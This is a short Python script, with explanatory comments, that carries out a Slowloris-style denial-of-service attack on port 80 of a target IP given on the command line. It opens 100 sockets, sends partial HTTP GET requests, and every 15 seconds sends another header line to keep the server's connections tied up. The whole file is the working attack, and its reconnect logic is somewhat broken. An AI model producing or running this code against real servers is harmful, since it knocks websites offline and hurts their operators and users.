import socket
import random
import time
import sys

log_level = 2

def showscreen(text, level=1):
    if log_level >= level:
        print(text)

list_of_sockets = []

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

ip = sys.argv[1]
socket_count = 100
showscreen("Attacking {} with {} sockets.".format(ip, socket_count))

showscreen("Creating sockets...")
for _ in range(socket_count):
    try:
        showscreen("Creating socket nr {}".format(_), level=2)
        socketconnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# creating socket connection to the server as many as 100 socket
        socketconnection.settimeout(4)
        socketconnection.connect((ip, 80))
# sending the  http connection to the server ip adrees 
    except socket.error:
        break
    list_of_sockets.append(socketconnection)

showscreen("Setting up the sockets...")
for r in list_of_sockets:
    r.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
# sending the http header in the list of sockets with a GET Request which consists of random integer between 0 and 2000 and they are encoded in utf-8 format
    for header in regular_headers:
        r.send(bytes("{}\r\n".format(header).encode("utf-8")))
# sending bytes of used agent encoded in utf-8 format. it is trying to send partial http request

while True:
    showscreen("Sending keep-alive headers...")
    for s in list_of_sockets:
        try:
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
# sending partial encoded http random number request between 1 and 5000 
        except socket.error:
            list_of_sockets.remove(s)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, 80))
                for s in list_of_sockets:
                    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                    for header in regular_headers:
                        s.send(bytes("{}\r\n".format(header).encode("utf-8")))
            except socket.error:
                continue

    time.sleep(15)
# sending request in every 15 seconds 
